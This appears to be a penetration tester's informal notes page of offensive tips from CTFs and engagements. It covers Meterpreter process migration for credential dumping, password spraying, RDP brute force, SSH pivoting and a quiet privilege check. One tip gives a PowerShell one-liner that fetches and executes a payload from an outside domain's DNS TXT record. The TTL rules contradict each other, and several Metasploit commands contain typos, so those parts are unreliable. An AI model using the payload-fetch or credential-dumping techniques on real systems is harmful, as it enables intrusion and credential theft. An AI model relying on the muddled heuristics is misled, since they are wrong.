---
description: Unorganized collections of my notes from CTFs and penetration tests
---

# Offensive Security Notes

1\. Search for whitelisted applications when looking to migrate and dump credentials. During a penetration test I was struggling to dump credentials with Kiwi as a PoC. Migrating into an AppSense application that is required to be whitelisted by endpoints can result in easy l00t. [This link](https://knowledge.broadcom.com/external/article/171640/dlp-endpoint-agent-causes-delays-when-fi.html) lists a few of the executables that I was able to migrate into with Meterpreter and proceed to execute Kiwi from, namely EMUser.exe.

2\. Time to Live

```bash
TTL > 64 it is most likely a Linux box
TTL > 128 it is most likely a Windows
TTL < 128 most likely some type of networking device.
```

3\. Some quick notes on organizing tooling:

* Download and place the tool into /opt/ (e.g., Aquatone).&#x20;
* Execute the following command on the Aquatone binary: `ln -s /opt/aquatone/aquatone /usr/local/bin/aquatone`

3\. Reverse shell preferences:

* External: Bind shell
* Internal: Reverse shell

4\. [Microsoft has a great reference](https://docs.microsoft.com/en-us/dotnet/framework/migration-guide/versions-and-dependencies) for .NET Framework & Windows OS Versions. We can then [use a precompiled binary from SharpCollection](https://github.com/Flangvik/SharpCollection) to exploit the system.

* Compile the binaries yourself.. Unless it's a CTF.

5\. Performing password spraying with [SprayCharles](https://github.com/Tw1sm/spraycharles) from my experience is more successful than using the [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit). Ran into a situation on an engagement where multiple valid logins were reported as invalid by SprayingToolkit.&#x20;

6\. Kali Linux allows for multiple IP addresses to be set manually on an interface, allowing for you to set multiple callbacks in case one of your IP addresses gets banned. The following demonstrates a screenshot of this:

![](https://i.imgur.com/FYiHJX6.png)

7\. Download a Nessus scan via Metasploit:

```bash
# Load the Nessus plugin
load Nessus

# Authenticate to Nessus
nessus_connect $username:$password@127.0.0.1:8834

# List Available Nessus Scans (Pay attention to the ID)
nesssus_scan_list

# Export the Nessus Scan
Nessus_scan_export $id nessus

Download the Nessus scan to ~/.msf
nessus_report_download $id $fileid

# Report is then accessible in the ~/.msf4/local directory
# Rename the file to $client.nessus
```

8\. Quick SSH tips:

#### Add SOCKS to an Existing SSH Connection

```bash
<enter> ~C
-D 1080
```

#### Forward a Port on an Existing SSH Connection

```bash
<enter> ~C
-L 1337:localhost:1337
```

9\. Make your life significantly easier when analyzing email headers with [Message Header Analyzer](http://mha.azurewebsites.net).

10\. Trying to make a high quality screenshot to illustrate commands used? Check out [carbon.now.sh](https://carbon.now.sh/).&#x20;

10\. Don't know what a command does? There's no shame in that. For Linux check out [ExplainShell](https://explainshell.com/) and for PowerShell use[ ExplainPowershell](https://www.explainpowershell.com/).&#x20;

11\. Check the configuration of LAPS using a machine account per [@HackingLZ](https://twitter.com/hackinglz), as it was noted that configurations are often messed up for them.&#x20;

12\. Your daily reminder that RDP local admin bruteforce has no rate limiting.

13\. If you have a shell on a Windows host and need to check if your process is high integrity without sounding alarms, you can issue the following check:

```bash
# >= high if file listing is shown
CMD -> dir \windows\temp
PowerShell --> ls \windows\temp
```

14\. A fun way to execte payloads is via a domains TXT record, the following command will run the provided payload:

```bash
powershell . (nslookup -q=txt parzival.sh)[-1]
```

15\. Always perform content discovery both as an unauthenticated and authenticated user (provide cookies to tool of choice)
